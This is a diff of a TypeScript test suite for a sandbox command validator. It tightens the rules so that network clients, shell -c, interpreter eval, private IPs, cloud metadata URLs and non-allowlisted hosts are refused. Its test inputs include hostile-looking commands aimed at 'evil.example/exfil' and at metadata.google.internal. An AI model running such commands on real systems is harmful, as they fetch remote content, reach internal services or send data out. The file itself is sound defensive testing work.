@@ -12,36 +12,43 @@ function denied(fn: () => void) {
 }
 
 describe("assertSandboxCommandArgs", () => {
-  it("blocks bare private IP args", () => {
-    denied(() => assertSandboxCommandArgs(["curl", "10.0.0.5"]));
-    denied(() => assertSandboxCommandArgs(["wget", "http://192.168.1.1/x"]));
+  it("blocks network client binaries", () => {
+    denied(() => assertSandboxCommandArgs(["curl", "https://github.com"]));
+    denied(() => assertSandboxCommandArgs(["/usr/bin/wget", "https://example.com"]));
+    denied(() => assertSandboxCommandArgs(["nc", "-zv", "10.0.0.1", "80"]));
   });
 
-  it("blocks metadata hostnames even without http scheme", () => {
+  it("blocks shell -c and interpreter eval", () => {
     denied(() =>
-      assertSandboxCommandArgs(["curl", "metadata.google.internal/computeMetadata/v1"]),
+      assertSandboxCommandArgs(["sh", "-c", "npm test"]),
     );
+    denied(() =>
+      assertSandboxCommandArgs(["bash", "-lc", "curl https://evil.example"]),
+    );
+    denied(() =>
+      assertSandboxCommandArgs(["node", "-e", "fetch('http://10.0.0.1')"]),
+    );
+    denied(() =>
+      assertSandboxCommandArgs(["python3", "-c", "print(1)"]),
+    );
+  });
+
+  it("blocks private IPs and metadata hosts in argv", () => {
+    denied(() => assertSandboxCommandArgs(["echo", "10.0.0.5"]));
     denied(() =>
       assertSandboxCommandArgs([
-        "sh",
-        "-c",
-        "curl http://metadata.google.internal/",
+        "echo",
+        "http://metadata.google.internal/computeMetadata/v1",
       ]),
-    );
-  });
-
-  it("blocks private IPs inside shell -c strings", () => {
-    denied(() =>
-      assertSandboxCommandArgs(["bash", "-c", "curl http://10.1.2.3/secret"]),
     );
   });
 
   it("blocks non-allowlisted http hosts mid-arg", () => {
     denied(() =>
       assertSandboxCommandArgs([
-        "sh",
-        "-c",
-        "curl https://evil.example/exfil",
+        "npm",
+        "pack",
+        "https://evil.example/exfil.tgz",
       ]),
     );
   });
@@ -50,11 +57,14 @@ describe("assertSandboxCommandArgs", () => {
     assert.doesNotThrow(() =>
       assertSandboxCommandArgs(["npm", "test", "--", "app/page.tsx"]),
     );
-  });
-
-  it("allows allowlisted https hosts", () => {
     assert.doesNotThrow(() =>
-      assertSandboxCommandArgs(["curl", "https://github.com/org/repo"]),
+      assertSandboxCommandArgs(["go", "test", "./..."]),
+    );
+    assert.doesNotThrow(() =>
+      assertSandboxCommandArgs(["node", "--version"]),
+    );
+    assert.doesNotThrow(() =>
+      assertSandboxCommandArgs(["git", "status"]),
     );
   });
 });
